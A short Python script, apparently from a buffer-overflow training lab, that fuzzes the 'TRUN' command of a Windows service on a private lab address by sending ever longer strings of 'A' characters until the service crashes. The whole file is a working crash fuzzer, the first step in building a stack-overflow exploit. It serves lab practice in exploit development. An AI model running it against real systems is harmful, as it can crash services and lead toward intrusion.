#!/usr/bin/env python3

import socket, sys
#We need socket to send our packets
from time import sleep
#We use sleep to break up our fuzzing, don't need all of time

ip='10.10.83.199'
#ip address of Windows machine
port=9999
#port vulnerable service is running on
Command="TRUN /.:/"
#vulnerable command

string = Command + 100*"A"
#full string to pass

while True: #Runs continuously until crash
	try:
		with socket.socket() as s: #context manager for our socket
			s.connect((ip,port)) #connect to Windows machine's vulnerable service
			print("sending  {} bytes".format(len(string))) #tell us what is being sent
			s.send(bytes(string,'latin-1')) #sent the string, as bytes from latin ascii
			reply = s.recv(4096) #see what the reply is

	except:
		print("fuzzing crashed at {} bytes".format(len(string)))
		sys.exit(0)
	string += 100*"A" #increase packet size by 100 bytes (each char is 1 byte)
	sleep(0.8) #pause for reflection
